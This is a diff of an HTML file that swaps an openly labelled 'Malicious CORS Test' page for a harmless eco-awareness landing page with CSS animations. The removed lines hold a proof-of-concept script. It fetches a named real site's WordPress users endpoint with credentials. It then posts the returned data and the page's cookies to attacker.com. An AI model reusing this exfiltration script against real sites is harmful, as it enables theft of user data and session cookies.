@@ -1,46 +1,113 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Malicious CORS Test</title>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Eco Friendly - Save Nature</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(to bottom, #e0f7e9, #d4f1f4);
+      color: #2f4f4f;
+      text-align: center;
+      padding: 50px 20px;
+      animation: fadeIn 2s ease-in;
+    }
+
+    h1 {
+      font-size: 3em;
+      margin-bottom: 20px;
+      animation: slideInDown 1.5s ease-out;
+    }
+
+    p {
+      font-size: 1.2em;
+      max-width: 700px;
+      margin: 0 auto 40px;
+      line-height: 1.6;
+      animation: fadeInText 2s ease-in;
+    }
+
+    .section {
+      margin: 60px 0;
+      opacity: 0;
+      transform: translateY(30px);
+      animation: fadeUp 1.5s ease forwards;
+    }
+
+    .section:nth-child(2) {
+      animation-delay: 0.5s;
+    }
+    .section:nth-child(3) {
+      animation-delay: 1s;
+    }
+    .section:nth-child(4) {
+      animation-delay: 1.5s;
+    }
+
+    .highlight {
+      color: #2e7d32;
+      font-weight: bold;
+    }
+
+    footer {
+      margin-top: 60px;
+      font-size: 0.9em;
+      color: #555;
+      animation: fadeIn 2s ease-in 2s forwards;
+    }
+
+    /* Animations */
+    @keyframes fadeIn {
+      from { opacity: 0; }
+      to { opacity: 1; }
+    }
+
+    @keyframes slideInDown {
+      from { transform: translateY(-50px); opacity: 0; }
+      to { transform: translateY(0); opacity: 1; }
+    }
+
+    @keyframes fadeUp {
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @keyframes fadeInText {
+      0% { opacity: 0; transform: scale(0.95); }
+      100% { opacity: 1; transform: scale(1); }
+    }
+
+  </style>
 </head>
 <body>
-    <h1>CORS Test Page</h1>
-    <p>Check console for results or monitor network requests.</p>
-    <script>
-        // Send cross-origin request to jobs.kiwi.com
-        fetch('https://jobs.kiwi.com/wp-json/wp/v2/users', {
-            method: 'GET',
-            headers: {
-                'Accept': 'application/json'
-            },
-            credentials: 'include' // Include cookies (e.g., PHPSESSID)
-        })
-        .then(response => {
-            // Check CORS headers
-            const corsHeader = response.headers.get('Access-Control-Allow-Origin');
-            console.log('CORS Allow Origin:', corsHeader);
-            return response.json(); // Parse JSON response
-        })
-        .then(data => {
-            // Log data to console for debugging
-            console.log('Response Data:', data);
 
-            // Exfiltrate data to attacker's server
-            fetch('https://attacker.com/capture', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    source: 'jobs.kiwi.com',
-                    data: data,
-                    cookies: document.cookie
-                })
-            })
-            .then(() => console.log('Data sent to attacker server'))
-            .catch(err => console.error('Exfiltration failed:', err));
-        })
-        .catch(err => console.error('Fetch failed:', err));
-    </script>
+  <h1>🌿 Go Green, Live Clean 🌿</h1>
+  <p>Together, we can protect our planet. Let's build a cleaner, greener, and more sustainable future.</p>
+
+  <div class="section">
+    <h2 class="highlight">🌳 Save Trees</h2>
+    <p>Plant more trees and protect forests. Trees absorb CO₂, clean the air, and provide homes for wildlife.</p>
+  </div>
+
+  <div class="section">
+    <h2 class="highlight">💧 Save Water</h2>
+    <p>Use water wisely. Every drop saved helps conserve this precious resource for future generations.</p>
+  </div>
+
+  <div class="section">
+    <h2 class="highlight">♻️ Reduce, Reuse, Recycle</h2>
+    <p>Be mindful of waste. Choose reusable items, recycle properly, and reduce consumption wherever you can.</p>
+  </div>
+
+  <footer>
+    Made with care for the Earth 💚 | © 2025 Eco Initiative
+  </footer>
+
 </body>
 </html>
